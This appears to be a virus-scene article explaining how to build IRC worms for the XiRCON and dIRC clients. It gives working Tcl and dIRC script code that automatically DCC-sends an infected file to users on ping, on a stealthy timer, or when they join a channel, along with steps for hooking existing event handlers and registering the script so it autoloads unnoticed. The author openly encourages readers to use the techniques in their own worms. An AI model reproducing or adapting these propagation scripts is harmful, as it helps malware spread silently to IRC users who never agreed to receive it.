  IRC (Internet Relay Chat) has been being a virus spreading field for years.
  Nowadays there are three different programs, which allow virus spreading via
  IRC. These are mIRC, pIRCh and vIRC. SnakeByte wrote an article about how
  to spread viruses with these three programs some years ago (www.snake-basket.de).
  But when I sat down and thought, why aren't there more programs, I got no
  senseful answere, so I downloaded some programs, and tried to make a new
  virus-script for them. And, as you may imagine, I had more than less some
  successes. I wrote some scripts for some IRC clients, and added some information.
  The result of my working is this article. :) Well, stop reading this intro
  now, and learn, how to spread your virus/worm via other IRC clients.




  1) XiRCON

     a) Information about XiRCON

        This is not a very common program, anyway, it's possible to write worms
        for it, and therefore I decided to make such a worm. :) Well, you will find 
        the program here: www.xirchon.com. XiRCON uses a complex syntax for it's scripts
        and you're able to do really much with it. The auto-script is called 'Default.tcl',
        and is directly in the XiRCON-directory (-programfiles-/XiRCON/ is the standart).
        The standart scripts in there are nothing important, but nice to learn from :). OK,
        the program is able to uses 24 different events, but unfortunatly there are no
        directly 'join-user' event, so we have to do it in another way. But you will see....



     b) Spreading: The hard way

        You may wonder, what the topic is about, but you will see :). The infected user should
        not recognize, that he/she is infected. OK, as I've already told you before, there is
        no 'good' virus-event, so I thougth, it would be of some sense, to use the event
        'CTCP', which is PING. Note: If the event already exists, you can't just add the same
        again, because there would be an error. Therefore search in the whole script for a string
        called 'on ctcp {'. If it exists, hook it, otherwise, add the new one. Well, the worm
        script will be active, if any user pings you.
        Now: what does it? It sends the infected file (here it is 'test.txt') to every nick
        in every channel, where the infected user is. Now you know, why this is called 'hard way'.
        Since every user gets a virus (also the OPs), the infected user will be kicked in some
        channels (believe me, I tested it :D). Anyway, there will be many new infected people,
        and so the worm did what we was expect to do. Now look at the source, and you'll under-
        stand it.

 - = - = - = - = - = - = - = - = - = - [XiRCON: The hard way] - = - = - = - = - = - = - = - = - = -
on ctcp {
  foreach n [channels] {
    if {$n != [my_nick]} {
      /dcc send $n test.txt
    }
  }
}
 - = - = - = - = - = - = - = - = - = - [XiRCON: The hard way] - = - = - = - = - = - = - = - = - = -



     c) Spreading: The (more) silence way

        At the first example the infected person will recognize that something smells fishy. So I
        did it in another way, better, but not so fast. But in my opinion you should use this one
        because the user don't know so fast, that he's infected. Well, this time I used two events:
        'CTCP' again and (the new one) 'timer', which runs once time per second. It's behavior is the
        following: A variable (called 'sent') is set to 1. Now somebody pings you, and the variable
        will set to 0 and the nick of the PINGer is saved as 'sentto'. Now the fun begins in the
        timer-event. The event checks, if sent!=1, and then it waits 1-30sec. After that it sends the
        infected file to 'sentto'. Finishing the event, 'sent' is 1 again, and the whole is waiting
        for the next ping :). Again: The two events must not be twice in a file. So look for the 
        events and hook them (overwrite the code or just add it). Now, look at the source, and you
        will understand, how to do this.

 - = - = - = - = - = - = - = - = - = - [XiRCON: The (more) silence way] - = - = - = - = - = - = - = - = - = -
set sent 1

on ctcp {
  set sent 0
  set sentto [nick]
}

on timer {
    set currTime [clock seconds]
    if {([expr ($currTime - 15) % 30] == 0) && ($currTime != 15) && ($sent != 1)} { 
       /dcc send $sentto test.txt
       set sent 1
    }
}
 - = - = - = - = - = - = - = - = - = - [XiRCON: The (more) silence way] - = - = - = - = - = - = - = - = - = -





  2) dIRC

     a) Information about dIRC

        This is a funny, very colorful IRC client, which you can find here: http://www.dircchat.com.
        The standart-directory is this one: -program-files-\Dragonmount Networks\dIRC.
        dIRC uses just 12 different events and only 7 (!!!) variables. You may think that sucks but
        a worm code don't need really much. Fortunatly this program has a 'join'-event, so it's quite
        easier to write a IRC-worm for dIRC as for the XiRCON. Well, the program auto-loads a script
        called 'standard.dsf' in the directory 'scripts'. The whole standart content (760 byte - wooow)
        is completly bullshit :). The program has a script-editor, where it's easy to generate new
        aliases or events. Hmm, well, I think that I said everything important...



     b) Spreading: One by One

        As I've already told you, dIRC has a 'join' event, which is executed every time when a user joins
        a channel, and it returns the nickname of the person and the channel, where (s)he joined. OK, cool,
        let's think: We have the nick of a person who joined a channel?? What to do? INFECT!!! :)
        Look at the example. It's really easy to understand, and it's very(!!!) shourt (two lines). If you
        want to use the technique, add the code to the 'standart.dsf' or make a new .dsf file in the script
        directory as I did it. Don't forget the first (empty) line and the last line ('==='), since it's
        dIRC syntax [cooool! :D]
        NOTE: 'dIRC dcc send' automatically ignores '.exe' and '.vbs' files!

 - = - = - = - = - = - = - = - = - = - [dIRC: One by One] - = - = - = - = - = - = - = - = - = -
#commands
#VBScript
!!! Do not edit the contents of this file. !!!

#EVENT# vir Join	*	*	on
sendcommand "/dcc send " & Nick & " test.txt"
===
 - = - = - = - = - = - = - = - = - = - [dIRC: One by One] - = - = - = - = - = - = - = - = - = -

        OK, now we have our script, which infects every user who joins to a channel. But we have also
        load the script, otherwise it won't work. How to do this? In the dIRC-folder we'll find a
        file called 'scripts.drc'. This file saves every script that becomes loaded. Here we have to add
        a line with our script-file. Let's look at the hooked filecontent:

 - = - = - = - = - = - = - = - = - = - [dIRC: One by One] - = - = - = - = - = - = - = - = - = -
C:\Programme\Dragonmount Networks\dIRC\scripts\standard.dsf	commands	VBScript
C:\Programme\Dragonmount Networks\dIRC\scripts\virus.dsf	commands	VBScript

 - = - = - = - = - = - = - = - = - = - [dIRC: One by One] - = - = - = - = - = - = - = - = - = -

        That should explain everthing. If you do all these things, your dIRC-worm will work...





  3) Last words

  Internet Relay Chat is a very successful way, how you can spread your viruses. And, as far as I
  know, there are just 3 programs around, where we are able to make a worm for it. Well, as I thought
  3 programs are too few. So I sat down, downloaded some programs, and made a worm for them. I hope you
  like this article and you will use some of the techniques I told you in one of your next worms. :)
  It would be cool if you could send me a mail, and tell me, what you think about this article.
  I think I said everything important and you read everything important, so: Go on writing a cool virus
  or worm. :D
  A very big thanks goes to SlageHammer for helping me to test the codes.
